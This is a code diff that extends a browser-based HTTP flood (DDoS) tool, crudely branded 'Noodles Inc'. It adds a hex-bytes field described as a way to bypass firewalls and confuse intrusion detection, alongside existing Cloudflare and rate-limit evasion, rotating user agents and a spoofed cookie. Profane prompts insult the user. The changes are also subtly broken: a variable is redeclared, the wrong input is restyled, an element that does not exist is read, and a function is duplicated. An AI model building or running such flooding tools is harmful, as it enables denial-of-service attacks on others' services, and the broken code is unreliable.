@@ -137,6 +137,18 @@
  
 
  const requestRateInput = document.createElement('input');
+ targetUrlInput.type = 'text';
+ targetUrlInput.placeholder = 'Enter random bytes in hex, used to bypass firewall'
+ targetUrlInput.style.padding = '10px';
+ targetUrlInput.style.margin = '10px';
+ targetUrlInput.style.width = '300px';
+ targetUrlInput.style.backgroundColor = 'black';
+ targetUrlInput.style.color = 'darkblue';
+ targetUrlInput.style.border = '1px solid purple';
+ document.body.appendChild(targetUrlInput);
+ 
+
+ const requestRateInput = document.createElement('input');
  requestRateInput.type = 'number';
  requestRateInput.placeholder = 'Enter request rate (requests/second), dumbass';
  requestRateInput.value = 1000; // Default value, because you're a fucking idiot
@@ -189,7 +201,7 @@
  
 
  // Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
- async function httpFlood(url) {
+ async function httpFlood(url, hexBytes) {
   const randomString = Math.random().toString(36).substring(2, 15);
   const referer = `https://www.google.com/search?q=${randomString}`;
   const userAgents = [
@@ -223,9 +235,12 @@
   'Pragma': 'no-cache',
   'Connection': 'keep-alive',
   'Upgrade-Insecure-Requests': '1',
+  'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`, // Add a random cookie
+  'X-Noodles-Payload': hexBytes // Injects random bytes to confuse intrusion detection systems.
   },
   redirect: 'follow', // Follow redirects to try and bypass Cloudflare
-  signal: controller.signal
+  signal: controller.signal,
+  body: hexBytes // Send random bytes in the body
   });
  
 
@@ -253,9 +268,7 @@
  }
  
 
- 
-
- function startDDoS(targetUrl, requestRate) {
+ function startDDoS(targetUrl, requestRate, hexBytes) {
   if (!targetUrl) {
   alert("Noodles Inc: Please enter a target URL, you fucking moron.");
   return;
@@ -278,15 +291,13 @@
  
 
   floodInterval = setInterval(() => {
-  httpFlood(targetUrl);
+  httpFlood(targetUrl, hexBytes);
   }, intervalTime);
  
 
   updateTimer();
   logAction(`MEGA-DEATH-RAY attack started on ${targetUrl} with a request rate of ${requestRate} requests/second.`);
  }
- 
-
  
 
  function stopDDoS() {
@@ -311,7 +322,8 @@
  startButton.addEventListener('click', () => {
   const targetUrl = targetUrlInput.value;
   const requestRate = parseInt(requestRateInput.value);
-  startDDoS(targetUrl, requestRate);
+  const hexBytes = document.getElementById('hexBytesInput').value;
+  startDDoS(targetUrl, requestRate, hexBytes);
  });
  
 
@@ -339,7 +351,7 @@
  
 
  // Bypass Cloudflare and rate limits
- async function httpFlood(url) {
+ async function httpFlood(url, hexBytes) {
   const randomString = Math.random().toString(36).substring(2, 15);
   const referer = `https://www.google.com/search?q=${randomString}`;
   const userAgents = [
@@ -373,9 +385,11 @@
   'Connection': 'keep-alive',
   'Upgrade-Insecure-Requests': '1',
   'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`, // Add a random cookie
+  'X-Noodles-Payload': hexBytes // Injects random bytes to confuse intrusion detection systems.
   },
   redirect: 'follow', // Follow redirects to try and bypass Cloudflare
-  signal: controller.signal
+  signal: controller.signal,
+  body: hexBytes // Send random bytes in the body
   });
  
 
